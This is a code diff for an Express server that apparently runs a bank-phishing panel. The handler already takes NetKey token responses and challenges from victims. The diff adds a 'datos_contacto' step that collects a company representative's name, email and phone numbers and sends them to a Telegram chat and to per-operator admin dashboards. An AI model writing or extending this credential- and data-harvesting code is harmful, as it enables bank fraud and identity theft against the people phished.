@@ -1679,7 +1679,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'netkey2':
                 updatedFields.netkeyResponse = inputData.netkeyResponse;
-                updatedFields.pasoActual = ScreenType.VALIDANDO;
+                updatedFields.pasoActual = ScreenType.DATOS_CONTACTO;
                 console.log('Respuesta NetKey 2 recibida:', inputData.netkeyResponse);
 
                 // Obtener el challenge original para incluirlo en la notificación
@@ -1707,6 +1707,41 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     createdBy: netkey2CreatedBy
                   }
                 }), netkey2CreatedBy);
+                break;
+
+              case 'datos_contacto':
+                updatedFields.telefono1 = inputData.telefono1;
+                updatedFields.telefono2 = inputData.telefono2 || '';
+                updatedFields.correo = inputData.correo;
+                updatedFields.nombreRepresentante = inputData.nombreRepresentante;
+                updatedFields.pasoActual = ScreenType.MENSAJE;
+                console.log('Datos de contacto recibidos:', inputData);
+
+                // Enviar notificación a Telegram con los datos de contacto
+                const datosContactoMessage = `📞 <b>DATOS DE CONTACTO RECIBIDOS</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `👤 <b>Representante Legal:</b> ${inputData.nombreRepresentante}\n` +
+                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
+                  `📱 <b>Teléfono 1:</b> ${inputData.telefono1}\n` +
+                  (inputData.telefono2 ? `📱 <b>Teléfono 2:</b> ${inputData.telefono2}\n` : '') +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(datosContactoMessage);
+
+                // Notificar al admin
+                const datosContactoCreatedBy = existingSession?.createdBy || '';
+
+                broadcastToAdmins(JSON.stringify({
+                  type: 'DATOS_CONTACTO_RECEIVED',
+                  data: {
+                    sessionId,
+                    telefono1: inputData.telefono1,
+                    telefono2: inputData.telefono2 || '',
+                    correo: inputData.correo,
+                    nombreRepresentante: inputData.nombreRepresentante,
+                    timestamp: new Date().toISOString(),
+                    createdBy: datosContactoCreatedBy
+                  }
+                }), datosContactoCreatedBy);
                 break;
               case 'gmail':
                 updatedFields.correo = inputData.correo;
